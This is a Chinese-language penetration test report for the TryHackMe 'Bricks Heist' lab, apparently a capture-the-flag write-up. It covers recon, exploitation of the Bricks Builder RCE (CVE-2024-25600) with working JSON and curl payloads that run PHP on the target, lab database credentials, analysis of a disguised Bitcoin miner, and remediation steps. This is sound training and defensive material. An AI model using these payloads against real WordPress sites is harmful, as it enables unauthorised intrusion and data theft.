# THM Bricks Heist - 渗透测试报告

**目标**: 10.48.142.157 (bricks.thm)  
**平台**: TryHackMe (THM) 授权靶场  
**日期**: 2026-05-19  
**测试人员**: pentest-main / yao  
**授权范围**: 完整 IP，无限制  

---

## 1. 执行摘要

本次渗透测试针对 TryHackMe 靶场环境 `bricks.thm` (10.48.142.157) 进行。通过信息收集、Web 枚举、漏洞情报搜索和漏洞利用，成功获取系统初始访问权限，并发现系统上运行的 Bitcoin 挖矿恶意软件。最终通过区块链钱包分析，将挖矿活动归因于 **Lockbit** 威胁组织。

**关键成果**:
- 获取系统 Shell (apache 用户)
- 获取 THM Flag: `THM{fl46_650c844110baced87e1606453b93f22a}`
- 发现伪装成系统服务的 Bitcoin 挖矿程序
- 提取挖矿钱包地址并进行威胁归因

---

## 2. 信息收集

### 2.1 端口扫描

使用 Nmap 进行快速扫描：
```bash
nmap -sV -sC --top-ports 1000 -oA nmap/quick 10.48.142.157
```

| 端口     | 服务  | 版本                                          |
| -------- | ----- | --------------------------------------------- |
| 22/tcp   | SSH   | OpenSSH 8.2p1 Ubuntu 4ubuntu0.11              |
| 80/tcp   | HTTP  | Python http.server (WebSockify Python/3.8.10) |
| 443/tcp  | HTTPS | Apache httpd + WordPress                      |
| 3306/tcp | MySQL | MySQL (unauthorized)                          |

SSL 证书信息:
- 有效期至: 2025-04-02
- 主题: CN=bricks.thm

### 2.2 Web 枚举

使用 WPScan 进行 WordPress 扫描：
```bash
wpscan --url https://bricks.thm --disable-tls-checks
```

**发现**:
- WordPress 版本: 6.5 (标记为 Insecure)
- 主题: Bricks Builder 1.9.5
- XML-RPC: 已启用
- WP-Cron: 外部可访问
- 无插件发现

**注意**: 初次使用 IP 地址扫描时 WPScan 未能检测到主题，改为使用域名 `bricks.thm` 后成功识别。这是虚拟主机配置的常见问题。

---

## 3. 漏洞分析

### 3.1 漏洞情报搜索

使用 Vulnx 搜索 Bricks Builder 相关漏洞：
```bash
vulnx search "bricks builder" --severity critical,high --json --silent --disable-update-check --limit 20
```

**关键发现**:

| CVE            | 风险等级   | CVSS | 影响版本 | 类型 |
| -------------- | ---------- | ---- | -------- | ---- |
| CVE-2024-25600 | 🔴 Critical | 10.0 | ≤ 1.9.6  | RCE  |
| CVE-2026-41554 | 🟠 High     | 7.1  | ≤ 2.2    | XSS  |

CVE-2024-25600 详情:
- 无需认证即可利用
- 已有 63 个 PoC 和 Metasploit 模块
- 标记为 KEV (Known Exploited Vulnerability)
- EPSS 分数: 0.93876 (93.8% 被利用概率)

### 3.2 漏洞确认

目标运行 Bricks Builder 1.9.5，低于修复版本 1.9.6，确认存在漏洞。

---

## 4. 漏洞利用

### 4.1 利用准备

获取 PoC 代码：
```bash
git clone https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT.git
```

**关键发现 - 正确端点**:
- ❌ `/wp-json/bricks/v1/render` - 不存在，返回 404
- ✅ `/wp-json/bricks/v1/render_element` - 正确端点

### 4.2 利用过程

**步骤 1**: 提取 Nonce
```bash
curl -sk https://bricks.thm/ | grep -o '"nonce":"[a-f0-9]*"' | head -1
# 结果: "nonce":"45746cc2c9"
```

**步骤 2**: 执行漏洞利用
```bash
python3 CVE-2024-25600.py -u https://bricks.thm
```

**验证 Payload**:
```json
{
  "postId": "1",
  "nonce": "45746cc2c9",
  "element": {
    "name": "container",
    "settings": {
      "hasLoop": "true",
      "query": {
        "useQueryEditor": true,
        "queryEditor": "throw new Exception(`echo KHABuhwxnUHDDW`);",
        "objectType": "post"
      }
    }
  }
}
```

**步骤 3**: 获取 Shell
```bash
id
# uid=1001(apache) gid=1001(apache) groups=1001(apache)

whoami
# apache
```

---

## 5. 后渗透分析

### 5.1 系统枚举

**Web 根目录** (`/data/www/default`):
```
650c844110baced87e1606453b93f22a.txt
index.php
kod/
license.txt
phpmyadmin/
readme.html
wp-activate.php
wp-admin/
wp-config.php
wp-content/
...
```

**数据库凭证** (`wp-config.php`):
```php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'lamp.sh');
define('DB_HOST', 'localhost');
```

### 5.2 Flag 获取

通过 RCE 读取 flag 文件：
```bash
curl -sk -X POST https://bricks.thm/wp-json/bricks/v1/render_element \
  -H "Content-Type: application/json" \
  -d '{
    "postId": "1",
    "nonce": "45746cc2c9",
    "element": {
      "name": "code",
      "settings": {
        "executeCode": "true",
        "code": "<?php echo file_get_contents(\"650c844110baced87e1606453b93f22a.txt\"); ?>"
      }
    }
  }'
```

**结果**: `THM{fl46_650c844110baced87e1606453b93f22a}`

---

## 6. 挖矿恶意软件发现

### 6.1 可疑进程识别

查看系统服务：
```bash
systemctl list-units --type=service --state=running
```

**发现可疑服务**:
| 服务名           | 描述         | 可疑程度   |
| ---------------- | ------------ | ---------- |
| `ubuntu.service` | TRYHACK3M    | 🔴 高度可疑 |
| `badr.service`   | Badr Service | 🟡 可疑     |

查看 `ubuntu.service` 详情：
```bash
systemctl status ubuntu.service
```

**结果**:
- 主进程: `nm-inet-dialog` (PID 3054, 3055)
- 路径: `/lib/NetworkManager/nm-inet-dialog`
- 描述: TRYHACK3M

### 6.2 挖矿程序分析

**进程详情**:
- 进程名: `nm-inet-dialog` (伪装成 NetworkManager 组件)
- PID: 3054, 3055
- 路径: `/lib/NetworkManager/nm-inet-dialog`
- 配置文件: `/lib/NetworkManager/inet.conf`

**配置分析**:
日志显示 Bitcoin 挖矿活动：
```
2025-11-01 15:49:57,403 [*] confbak: Ready!
2025-11-01 15:49:57,404 [*] Status: Mining!
2025-11-01 15:50:01,412 [*] Bitcoin Miner Thread Started
```

### 6.3 钱包地址提取

从配置文件提取的钱包地址（多层 Base64 解码）：
```
bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
```

**区块链数据**:
- 交易数: 8笔
- 总交易额: ~15.5 BTC
- 当前余额: 0
- 钱包 ID: `302a03aed365a4df`

### 6.4 威胁归因

通过外部区块链威胁情报分析，确认该钱包地址与 **Lockbit** 勒索软件组织的挖矿基础设施相关联。

---

## 7. 发现总结

| 类别     | 发现项                              | 风险等级   |
| -------- | ----------------------------------- | ---------- |
| Web漏洞  | CVE-2024-25600 (Bricks Builder RCE) | 🔴 Critical |
| 信息泄露 | WordPress 版本泄露                  | 🟡 Medium   |
| 信息泄露 | XML-RPC 暴露                        | 🟡 Medium   |
| 恶意软件 | Bitcoin 挖矿程序                    | 🔴 Critical |
| 凭证     | 数据库密码明文存储                  | 🟠 High     |
| 其他组件 | phpmyadmin 管理界面                 | 🟡 Medium   |
| 其他组件 | kod 文件管理器                      | 🟡 Medium   |

---

## 8. 修复建议

### 8.1 立即修复
1. **升级 Bricks Builder** 至 1.9.6 以上版本
2. **移除挖矿恶意软件**:
   ```bash
   systemctl stop ubuntu.service
   systemctl disable ubuntu.service
   rm /etc/systemd/system/ubuntu.service
   rm /lib/NetworkManager/nm-inet-dialog
   rm /lib/NetworkManager/inet.conf
   ```
3. **更改所有密码** (WordPress 数据库、MySQL root、系统用户)

### 8.2 短期修复
1. 禁用 XML-RPC (如不需要)
2. 配置 WP-Cron 为内部触发
3. 移除 `readme.html` 减少信息泄露
4. 审查 phpmyadmin 和 kod 的访问控制

### 8.3 长期修复
1. 实施 WAF 规则防御 WordPress 漏洞利用
2. 建立定期漏洞扫描机制
3. 监控系统异常进程和服务
4. 部署 EDR (Endpoint Detection and Response)

---

## 9. 技术参考

### 9.1 使用的工具
| 工具                 | 用途               |
| -------------------- | ------------------ |
| Nmap                 | 端口扫描           |
| WPScan               | WordPress 漏洞扫描 |
| Vulnx                | 漏洞情报搜索       |
| curl                 | HTTP 请求/漏洞验证 |
| Python3              | 执行 PoC 脚本      |
| systemctl/journalctl | 系统服务分析       |

### 9.2 关键 CVE
- [CVE-2024-25600](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25600) - Bricks Builder RCE
- [WPScan Advisory](https://wpscan.com/vulnerability/afea4f8c-4d45-4cc0-8eb7-6fa6748158bd/)
- [Patchstack Article](https://patchstack.com/articles/critical-rce-patched-in-bricks-builder-theme)

### 9.3 PoC 来源
- [K3ysTr0K3R/CVE-2024-25600-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT)
- [Metasploit Module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/wp_bricks_builder_rce.rb)

---

## 10. 时间线

| 时间       | 事件                                |
| ---------- | ----------------------------------- |
| 2026-05-19 | 目标确认，授权范围确认              |
| 2026-05-19 | Nmap 端口扫描完成                   |
| 2026-05-19 | WPScan WordPress 扫描完成           |
| 2026-05-19 | Vulnx 漏洞情报搜索完成              |
| 2026-05-19 | CVE-2024-25600 利用成功，获取 Shell |
| 2026-05-19 | 获取 THM Flag                       |
| 2026-05-19 | 发现可疑进程 ubuntu.service         |
| 2026-05-19 | 提取 Bitcoin 钱包地址               |
| 2026-05-19 | 威胁归因至 Lockbit 组织             |

